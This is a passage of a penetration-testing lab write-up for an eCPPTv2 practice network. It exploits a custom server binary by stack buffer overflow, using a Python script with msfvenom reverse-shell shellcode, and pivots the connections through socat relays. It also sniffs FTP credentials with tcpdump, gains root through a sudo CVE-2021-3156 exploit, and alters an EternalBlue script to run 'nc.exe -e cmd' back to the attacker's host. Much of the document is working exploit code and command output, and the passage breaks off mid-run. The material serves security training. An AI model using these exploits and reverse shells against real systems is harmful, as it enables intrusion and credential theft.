Perfect! As we can see, we can reach the `Fawkes` machine.

## Enumeration
---

Of course, we are going to enumerate the opened ports with `nmap`:

```zsh
❯ proxychains -q nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.57.7 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:14 CEST
Initiating ARP Ping Scan at 16:14
Scanning 192.168.57.7 [1 port]
Completed ARP Ping Scan at 16:14, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:14
Scanning 192.168.57.7 [65535 ports]
Discovered open port 80/tcp on 192.168.57.7
Discovered open port 21/tcp on 192.168.57.7
Discovered open port 22/tcp on 192.168.57.7
Discovered open port 9898/tcp on 192.168.57.7
Discovered open port 2222/tcp on 192.168.57.7
Completed SYN Stealth Scan at 16:14, 1.46s elapsed (65535 total ports)
Nmap scan report for 192.168.57.7
Host is up, received arp-response (0.00029s latency).
Scanned at 2023-06-06 16:14:12 CEST for 2s
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 64
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
9898/tcp open  monkeycom    syn-ack ttl 63
MAC Address: 08:00:27:84:27:B9 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Now with `extractPorts` we are going to extract the relevant information and perform a deeper scan:

```zsh
❯ proxychains -q nmap -sCV -p21,22,80,2222,9898 192.168.57.7 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 16:15 CEST
Nmap scan report for 192.168.57.7
Host is up (0.00090s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  tcpwrapped
22/tcp   open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  tcpwrapped
2222/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
9898/tcp open  tcpwrapped
MAC Address: 08:00:27:84:27:B9 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
```

Ok, but with two proxyes the speed is not good, so we can use `xargs` to do it a little bit faster:

```zsh
❯ seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p {} -open -T5 -v -n 192.168.57.7 2>&1 | grep "tcp open"
21/tcp open ftp
22/tcp open ssh
80/tcp open http
2222/tcp open EtherNetIP-1
9898/tcp open monkeycom
```

To see the web we just need to set up a new proxy:

![](/assets/img/eCPPTv2/34.png)

Now we can easily access the web:

![](/assets/img/eCPPTv2/35.png)

## Foothold
---

We can notice also that the Anonymous login is enabled on `FTP`:

```zsh
❯ proxychains -q ftp 192.168.57.7
Connected to 192.168.57.7.
220 (vsFTPd 3.0.3)
Name (192.168.57.7:ruy): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||61322|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
226 Directory send OK.
ftp> cd server_hogwarts
550 Failed to change directory.
ftp> get server_hogwarts
local: server_hogwarts remote: server_hogwarts
229 Entering Extended Passive Mode (|||61665|)
150 Opening BINARY mode data connection for server_hogwarts (705996 bytes).
100% |***********************************************************************************************************************************************************************************|   689 KiB   63.77 MiB/s    00:00 ETA
226 Transfer complete.
705996 bytes received in 00:00 (60.99 MiB/s)
ftp> exit
221 Goodbye.
```

If we check this file, we can see that is a 332bit binary:

```zsh
❯ file server_hogwarts
server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped
```

We can see the actions of the binary by executing it with `strace`:

```zsh
❯ strace ./server_hogwarts
execve("./server_hogwarts", ["./server_hogwarts"], 0x7ffde324b1e0 /* 36 vars */) = 0
[ Process PID=192231 runs in 32 bit mode. ]
brk(NULL)                               = 0x8928000
brk(0x89287c0)                          = 0x89287c0
set_thread_area({entry_number=-1, base_addr=0x89282c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
uname({sysname="Linux", nodename="hax0r", ...}) = 0
readlink("/proc/self/exe", "/home/ruy/Escritorio/eCPPTv2/Faw"..., 4096) = 56
brk(0x89497c0)                          = 0x89497c0
brk(0x894a000)                          = 0x894a000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No existe el fichero o el directorio)
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEPORT, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(9898), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 3)                            = 0
accept(3, ^Cstrace: Process 192231 detached
 <detached ...>
```

Ok, we can notice that is setting a server on port **9898**. Let's run again the binary and connect with `netcat`:

![](/assets/img/eCPPTv2/36.png)

Before we saw that this machine had the port **9898** opened, which means that this binary is being executed. Let's try to connect with `netcat` to the server:

```zsh
❯ proxychains nc 192.168.57.10 9898
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  192.168.57.10:9898  ...  OK
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: 
```

## Buffer Overflow (Stack Based)
---

Ok, so we have a binary, and this is an `eCPPTv2` laboratory, so what the hell, this is a clearly **BoF** attack. To understand how this binary works, we are going to run it locally and try to exploit it **locally**, so when we need to exploit it on the `Fawkes` machine we can go directly to the point.
In this binary, its asking for an input, but what happens if the developer didn't sanitized the number of bytes of the input? Well, he/she maybe established a buffer size, but if this input is not being sanitized, we could input a lot of junk bytes so the program should crash, giving as error a `Segmentation Fault`:

![](/assets/img/eCPPTv2/37.png)

What is happening here? Well, I am going to explain it with this pictures:

![](/assets/img/buffemr/17.png)

Here we can see that there are some registers such as `EBP` and `RET` (which is `EIP`). But, because the  user's intput is not being sanitized, if we put a lot of junk characters, the program will overwrite those registers causing a segmentation fault:

![](/assets/img/buffemr/18.png)

### PoC ~ Getting shell as Harry Potter
---

First we need to debug the program, so let's open it with `gdp` and cause it to crash:

![](/assets/img/eCPPTv2/38.png)

Now let's input the junk bytes:

![](/assets/img/eCPPTv2/39.png)

As we can see here, we are being able to overwrite the registers `EIP` and `EDB`, within some other more of them.
We can use `checksec` to see the binary protections and configurations:

![](/assets/img/eCPPTv2/40.png)

Oohohoho... So `NX` is disabled huh? Well, this allows us to make that the execution of the program goes to an especificated memory direction, in which we could load our `shellcode`.
We can use `pattern create` so `gdb` will create us a random pattern of **1024 bytes**, and when we input this pattern into the program, we are going to identify when we can start taking full control of the `EIP`:

![](/assets/img/eCPPTv2/41.png)

All right! We can see that the `EIP` is starting to be modified on `daab`, so we can use regular expressions to see where `daab` is placed on the pattern:

![](/assets/img/eCPPTv2/42.png)

Ok, here we can see where we can start modifying the `EIP` register. I am pretty lazy and I don't want to be counting all the characters, so I am going to use `pattern offset $eip` to see how many bytes we need to input before we start overwriting the `EIP` register:

![](/assets/img/eCPPTv2/43.png)

Ok, now we are going to use python to create a payload, which will allow us to know if we are successfully overwriting the `EIP` register:

```zsh
❯ python3 -c 'print ("A"*112 + "B"*4 + "C"*100)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

Inputting this payload on the binary, we should see `EIP` with a value of `0x42424242`, because `BBBB` on hexadecimal representation means that:

![](/assets/img/eCPPTv2/44.png)

Now in `gdb` we should see the modified `EIP`:

![](/assets/img/eCPPTv2/45.png)

Perfect!! 
To practice a little bit of python, let's automate this `BoF` with a python script :D

```python
#!/usr/bin/python3

import socket

offset = 112
before_eip = b"A" * offset
# eip = 
after_eip = b"\x90"*32 + b"C"*100 # ESP
```

Now, instead of putting 100 "C" on `ESP`, we are going to generate a `shellcode`.
To generate this first `shellcode` we will use `msfvenom`, which will send us a bash from our local attacker's machine to the same machine, just for testing:

```zsh
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.111 LPORT=443 -b "\x00" -f py -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of py file: 550 bytes
shellcode =  b""
shellcode += b"\xd9\xc8\xba\x86\xd9\x36\xae\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x12\x83\xc5\x04\x31\x55\x13"
shellcode += b"\x03\xd3\xca\xd4\x5b\xea\x37\xef\x47\x5f\x8b"
shellcode += b"\x43\xe2\x5d\x82\x85\x42\x07\x59\xc5\x30\x9e"
shellcode += b"\xd1\xf9\xfb\xa0\x5b\x7f\xfd\xc8\x9b\xd7\xfd"
shellcode += b"\x67\x74\x2a\xfe\x76\x3f\xa3\x1f\xc8\x59\xe4"
shellcode += b"\x8e\x7b\x15\x07\xb8\x9a\x94\x88\xe8\x34\x49"
shellcode += b"\xa6\x7f\xac\xfd\x97\x50\x4e\x97\x6e\x4d\xdc"
shellcode += b"\x34\xf8\x73\x50\xb1\x37\xf3"
```

>**Note:** If the file `/proc/sys/kernel/randomize_va_space` is equal to `2`, edit it so it has a value of `0`.

Now, our we remove the "C"s and we replace it with the `shellcode` variable:

```python
#!/usr/bin/python3

import socket

offset = 112
before_eip = b"A" * offset
# eip = 

shellcode =  b""
shellcode += b"\xd9\xc8\xba\x86\xd9\x36\xae\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x12\x83\xc5\x04\x31\x55\x13"
shellcode += b"\x03\xd3\xca\xd4\x5b\xea\x37\xef\x47\x5f\x8b"
shellcode += b"\x43\xe2\x5d\x82\x85\x42\x07\x59\xc5\x30\x9e"
shellcode += b"\xd1\xf9\xfb\xa0\x5b\x7f\xfd\xc8\x9b\xd7\xfd"
shellcode += b"\x67\x74\x2a\xfe\x76\x3f\xa3\x1f\xc8\x59\xe4"
shellcode += b"\x8e\x7b\x15\x07\xb8\x9a\x94\x88\xe8\x34\x49"
shellcode += b"\xa6\x7f\xac\xfd\x97\x50\x4e\x97\x6e\x4d\xdc"
shellcode += b"\x34\xf8\x73\x50\xb1\x37\xf3"

after_eip = b"\x90"*32 + shellcode # ESP
```

In the `eip` variable we need to input the memory address in which will apply a jump to the `ESP`, so at the time of executing this instruction, the program will go to the stack (ESP) and will execute the `shellcode`.

>**Note:** The `\x90` are `NOPs`. This is because if we indicate that the shellcode has to be executed straight away when the `EIP` ends, it may cause some error, so we put 32 NOPs so the execution of the program has a little margin of error.

Now, to find the `eip` variable, we need to use `objdump` and `nasm_shell.rb`:

![](/assets/img/eCPPTv2/46.png)

Now, let's execute `objdump`:

![](/assets/img/eCPPTv2/47.png)

And here we can see the interested memory address. Because this is a 32bit binary, we need to "flip" the memory address:

```python
#!/usr/bin/python3

import socket

offset = 112
before_eip = b"A" * offset
eip = "\x55\x9d\x04\x80" # 8049d55 -> jmp ESP

shellcode =  b""
shellcode += b"\xd9\xc8\xba\x86\xd9\x36\xae\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x12\x83\xc5\x04\x31\x55\x13"
shellcode += b"\x03\xd3\xca\xd4\x5b\xea\x37\xef\x47\x5f\x8b"
shellcode += b"\x43\xe2\x5d\x82\x85\x42\x07\x59\xc5\x30\x9e"
shellcode += b"\xd1\xf9\xfb\xa0\x5b\x7f\xfd\xc8\x9b\xd7\xfd"
shellcode += b"\x67\x74\x2a\xfe\x76\x3f\xa3\x1f\xc8\x59\xe4"
shellcode += b"\x8e\x7b\x15\x07\xb8\x9a\x94\x88\xe8\x34\x49"
shellcode += b"\xa6\x7f\xac\xfd\x97\x50\x4e\x97\x6e\x4d\xdc"
shellcode += b"\x34\xf8\x73\x50\xb1\x37\xf3"

after_eip = b"\x90"*32 + shellcode # ESP
```

This is how our `bof.py` script should look like. Now we need to establish the socket so the payload can be sent:

```python
#!/usr/bin/python3

import socket

# BoF variables
offset = 112
before_eip = b"A" * offset
eip = b"\x55\x9d\x04\x80" # 8049d55 -> jmp ESP

shellcode =  b""
shellcode += b"\xd9\xc8\xba\x86\xd9\x36\xae\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x12\x83\xc5\x04\x31\x55\x13"
shellcode += b"\x03\xd3\xca\xd4\x5b\xea\x37\xef\x47\x5f\x8b"
shellcode += b"\x43\xe2\x5d\x82\x85\x42\x07\x59\xc5\x30\x9e"
shellcode += b"\xd1\xf9\xfb\xa0\x5b\x7f\xfd\xc8\x9b\xd7\xfd"
shellcode += b"\x67\x74\x2a\xfe\x76\x3f\xa3\x1f\xc8\x59\xe4"
shellcode += b"\x8e\x7b\x15\x07\xb8\x9a\x94\x88\xe8\x34\x49"
shellcode += b"\xa6\x7f\xac\xfd\x97\x50\x4e\x97\x6e\x4d\xdc"
shellcode += b"\x34\xf8\x73\x50\xb1\x37\xf3"

after_eip = b"\x90"*32 + shellcode # ESP

# Socket variables
host = input("Enter victim's host: ")
port = int(input("Enter victim's port: "))
payload = before_eip + eip + after_eip
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(payload)
s.close()
```

What we are doing here is to ask for an IP and a port. Then, it establish a TCP connection and sends the payload, which is the `before_eip`, `eip`, and `after_eip`. After that, it closes the connection. Let's try the exploit!

![](/assets/img/eCPPTv2/48.png)

All righ! So we are able to get a reverse shell (locally)! Now we can try to get a reverse shell on the `Fawkes` machine, but we need to edit our `shellcode` and set up some `socat` things.
First of all, we need to change the `shellcode`'s IP, because if we notice, the reverse shell needs to be sent to `Nagini` > `Aragog` > attackers:

![](/assets/img/eCPPTv2/49.png)

To do that, we'd need to follow these steps:

- First, change the IP of the `shellcode` to the `Nagini`'s IP -> (192.168.57.11)

![](/assets/img/eCPPTv2/50.png)

- Then edit the python exploit to add the new `shellcode`:

![](/assets/img/eCPPTv2/51.png)

- Now we don't want to connect to our localhost, so because with `proxychains` we can reach the `Fawkes`' IP -> (192.168.57.10), we can specify this IP into the script:

![](/assets/img/eCPPTv2/52.png)

Ok, so the reverse shell is going to be sended on `Nagini`'s host and the port **4343**. Now, we want to redirect that trafic to the `Aragog` machine, and from the `Aragog` machine, move it to our attacker's machine:

- First of all we need to redirect the trafic of the port **4343** of the `Nagini`'s machine to a port of the `Aragog` machine:

```zsh
root@Nagini:/tmp# ./socat TCP-LISTEN:4343,fork TCP:192.168.56.6:4344
```

- Now we need to redirect the trafic of the port **4344** on the `Aragog` machine to redirect it to the port **443** of our attacker's machine:

```zsh
root@Aragog:~# ./socat TCP-LISTEN:4344,fork TCP:192.168.0.111:443
```

- After that set up a `netcat` listener:

```zsh
❯ nc -lvnp 443
listening on [any] 443 ...
```

And now we just need to execute the `BoF` exploit:

```zsh
❯ proxychains python3 bof.py
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  192.168.57.10:9898  ...  OK
```

And in the `netcat` listener we should obtain a reverse shell:

```zsh
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.0.111] from (UNKNOWN) [192.168.0.114] 43024
whoami
harry
```

Perfect!!
But, here is the big but, if we notice, we are on a `docker`!!

![](/assets/img/eCPPTv2/53.png)

## Docker Escape
---

To privilege escalate on the `docker` is very easy, just check `sudo -l` and you will know the answer:

```zsh
sudo -l
User harry may run the following commands on 2b1599256ca6:
    (ALL) NOPASSWD: ALL
sudo /bin/sh
whoami
root
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Perfect.
If we notice, in the `/root` directory we can see a file called `note.txt`:

```
Hello Admin!!

We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.
```

Ok, so is talking about someone login into our `ftp` server by mistake. This sounds curios, so first of all, let's check if this `docker` has `tcpdump` installed:

```sh
which tcpdump
/usr/bin/tcpdump
```

Ok nice. So we can see an interface called `eth0`, so I suppose that this is the one that we need to listen on:

```sh
cd /tmp
tcpdump -i eth0 port ftp or ftp-data
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
19:14:01.385644 IP 172.17.0.1.60628 > 2b1599256ca6.21: Flags [S], seq 187348969, win 64240, options [mss 1460,sackOK,TS val 1765668881 ecr 0,nop,wscale 7], length 0
19:14:01.385670 IP 2b1599256ca6.21 > 172.17.0.1.60628: Flags [S.], seq 1316541542, ack 187348970, win 65160, options [mss 1460,sackOK,TS val 165215805 ecr 1765668881,nop,wscale 7], length 0
19:14:01.385717 IP 172.17.0.1.60628 > 2b1599256ca6.21: Flags [.], ack 1, win 502, options [nop,nop,TS val 1765668881 ecr 165215805], length 0
19:14:01.387580 IP 2b1599256ca6.21 > 172.17.0.1.60628: Flags [P.], seq 1:21, ack 1, win 510, options [nop,nop,TS val 165215807 ecr 1765668881], length 20: FTP: 220 (vsFTPd 3.0.3)
19:14:01.387703 IP 172.17.0.1.60628 > 2b1599256ca6.21: Flags [.], ack 21, win 502, options [nop,nop,TS val 1765668883 ecr 165215807], length 0
19:14:01.388197 IP 172.17.0.1.60628 > 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 1765668883 ecr 165215807], length 14: FTP: USER neville
19:14:01.388226 IP 2b1599256ca6.21 > 172.17.0.1.60628: Flags [.], ack 15, win 510, options [nop,nop,TS val 165215807 ecr 1765668883], length 0
19:14:01.388425 IP 2b1599256ca6.21 > 172.17.0.1.60628: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 165215808 ecr 1765668883], length 34: FTP: 331 Please specify the password.
19:14:01.388694 IP 172.17.0.1.60628 > 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 1765668884 ecr 165215808], length 15: FTP: PASS bL!Bsg3k
19:14:01.432204 IP 2b1599256ca6.21 > 172.17.0.1.60628: Flags [.], ack 30, win 510, options [nop,nop,TS val 165215851 ecr 1765668884], length 0
19:14:04.380214 IP 2b1599256ca6.21 > 172.17.0.1.60628: Flags [P.], seq 55:77, ack 30, win 510, options [nop,nop,TS val 165218799 ecr 1765668884], length 22: FTP: 530 Login incorrect.
19:14:04.380302 IP 172.17.0.1.60628 > 2b1599256ca6.21: Flags [P.], seq 30:36, ack 77, win 502, options [nop,nop,TS val 1765671876 ecr 165218799], length 6: FTP: QUIT
19:14:04.380325 IP 2b1599256ca6.21 > 172.17.0.1.60628: Flags [.], ack 36, win 510, options [nop,nop,TS val 165218800 ecr 1765671876], length 0
19:14:04.380366 IP 2b1599256ca6.21 > 172.17.0.1.60628: Flags [P.], seq 77:
```

Interesting output. Here we can see a user and a password: (neville:bL!Bsg3k)
Now we can use these credentials to connect via `SSH`:

```zsh
❯ proxychains -q ssh neville@192.168.57.10
neville@192.168.57.10's password: 
Linux Fawkes 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
neville@Fawkes:~$ export TERM=xterm-256color
neville@Fawkes:~$ bash
neville@Fawkes:~$ ls
horcrux2.txt
neville@Fawkes:~$ 
```

Nice!! So we can see that this machine hasn't any other interfaces, so I think this is a dead endig. Anyways, let's root the machine.

## Privilege escalation
---

By checking our privileges we can see that we don't have much thing, so the next idea is to enumerate `SUID` binaries on the machine:

```bash
neville@Fawkes:~$ find / \-perm -4000 2>/dev/null
/usr/local/bin/sudo
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
neville@Fawkes:~$ 
```

Oh, interesting output. Here we can see that the binary `sudo` is an `SUID` binary, and by investigating a little bit on internet we can find that there are some exploits for old `sudo` versions. So first of all, let's check this version:

```bash
neville@Fawkes:~$ /usr/local/bin/sudo --version
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27
neville@Fawkes:~$ 
```

Now we can search on `Google` which is the latest version of `sudo`:

![](/assets/img/eCPPTv2/54.png)

Here we can see that this installed version of `sudo` is not the latest one, so let's search for an exploit of this version. After a few minutes I found [this exploit](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py). Let's copy the exploit and paste it in a file on the `Fawkes` machine:

![](/assets/img/eCPPTv2/55.png)

>**Note:** The `sudo` path is incorrect, we need to change it: `//usr/local/bin/sudo`

![](/assets/img/eCPPTv2/56.png)

And finally let's execute it:

```bash
neville@Fawkes:~$ python3 exploit.py
# whoami
root
# 
```

Rooted!

# Dumbledore-PC 
---

![](/assets/img/eCPPTv2/dumbledore.png)

---

We've alredy have connectivity with this machine, we can check it by pinging the IP:

```zsh
❯ proxychains -q ping -c 1 192.168.57.6
PING 192.168.57.6 (192.168.57.6) 56(84) bytes of data.
64 bytes from 192.168.57.6: icmp_seq=1 ttl=128 time=0.701 ms

--- 192.168.57.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.701/0.701/0.701/0.000 ms
``` 

Perfect. Remember that we got this IP by executing the `hostDiscovery.sh` on `Nagini`'s machine.

## Enumeration
---

As in all machines we are going to start by scanning the opened ports with `nmap`:

```zsh
❯ proxychains -q nmap -sT -Pn --top-ports 500 -open -T5 -v -n 192.168.57.6 2>/dev/null
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 22:09 CEST
Initiating Connect Scan at 22:09
Scanning 192.168.57.6 [500 ports]
Discovered open port 445/tcp on 192.168.57.6
Discovered open port 139/tcp on 192.168.57.6
Discovered open port 135/tcp on 192.168.57.6
Discovered open port 49154/tcp on 192.168.57.6
Discovered open port 49157/tcp on 192.168.57.6
Discovered open port 49156/tcp on 192.168.57.6
Connect Scan Timing: About 45.80% done; ETC: 22:10 (0:00:37 remaining)
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 48.60% done; ETC: 22:10 (0:00:35 remaining)
Discovered open port 49153/tcp on 192.168.57.6
Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 66.00% done; ETC: 22:10 (0:00:23 remaining)
Discovered open port 49152/tcp on 192.168.57.6
Discovered open port 49155/tcp on 192.168.57.6
Discovered open port 5357/tcp on 192.168.57.6
Completed Connect Scan at 22:10, 67.18s elapsed (500 total ports)
Nmap scan report for 192.168.57.6
Host is up (0.15s latency).
Not shown: 490 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 67.26 seconds
```

Ok, so we can see the port `445` opened, so it means that `SMB` is running. Let's see what version of Windows are we against:

```zsh
❯ proxychains -q crackmapexec smb 192.168.57.6
SMB         192.168.57.6    445    DUMBLEDORE-PC    [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:DUMBLEDORE-PC) (domain:Dumbledore-PC) (signing:False) (SMBv1:True)
```

Nice, so its a `Windows 7 Professional`, what this means? Well, we can see if it's vulnerable to `eternalblue`:

```zsh
❯ proxychains -q nmap -p445 --script "vuln and safe" 192.168.57.6
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 22:13 CEST
Nmap scan report for 192.168.57.6
Host is up (0.00056s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:62:DA:F2 (Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 2.24 seconds
```

Aaand ohh surprise! It is!

## Exploiting eternalblue (MS17-010)
--- 

We are not **lammers** so we are not going to use `metasploit`. Instead, we are going to use [AutoBlue](https://github.com/worawit/MS17-010). 
We are going to use `zzz_exploit.py` which will automate getting a shell:

```zsh
❯ proxychains python2.7 zzz_exploit.py 192.168.57.6
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  127.0.0.1:1080 <--socket error or timeout!
[proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  192.168.57.6:445  ...  OK
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa80025c2020
SESSION: 0xfffff8a001de9760
FLINK: 0xfffff8a002075088
InParam: 0xfffff8a00206f15c
MID: 0x3503
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Done
```

Ok, so here we can see that the exploit created a `pwned.txt` file on target, we can check it by our selves:

![](/assets/img/eCPPTv2/57.png)

Now we need to edit the command so it will send us a reverse shell:

```python
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()
    
    # print('creating file c:\\pwned.txt on the target')
    # tid2 = smbConn.connectTree('C$')
    # fid2 = smbConn.createFile(tid2, '/pwned.txt')
    # smbConn.closeFile(tid2, fid2)
    # smbConn.disconnectTree(tid2)
    
    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    service_exec(conn, r'cmd /c \\192.168.57.11\smbFolder\nc.exe -e cmd 192.168.57.11 5858')
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."
```

As we can see here the reverse shell is going to be sended to the `Nagini` machine to the port **5858**, but we are going to redirect that connection of that port to a port on the `Aragog` machine, and then redirect that connection to our attacker's machine to port **443**:

- SMB Server:

```zsh
# Nagini
root@Nagini:~# ./socat TCP-LISTEN:445,fork TCP:192.168.56.6:2323

# Aragog
./socat TCP-LISTEN:2323,fork TCP:192.168.0.111:445

# Attacker
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- Reverse shell:

```zsh
# Nagini
root@Nagini:~# ./socat TCP-LISTEN:5858,fork TCP:192.168.56.6:5757

# Aragog
root@Aragog:~# ./socat TCP-LISTEN:5757,fork TCP:192.168.0.111:4646

# Attacker
❯ rlwrap nc -lvnp 4646
listening on [any] 4646 ...
```

And by executing the exploit:

```zsh
❯ proxychains python2.7 zzz_exploit.py 192.168.57.6
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
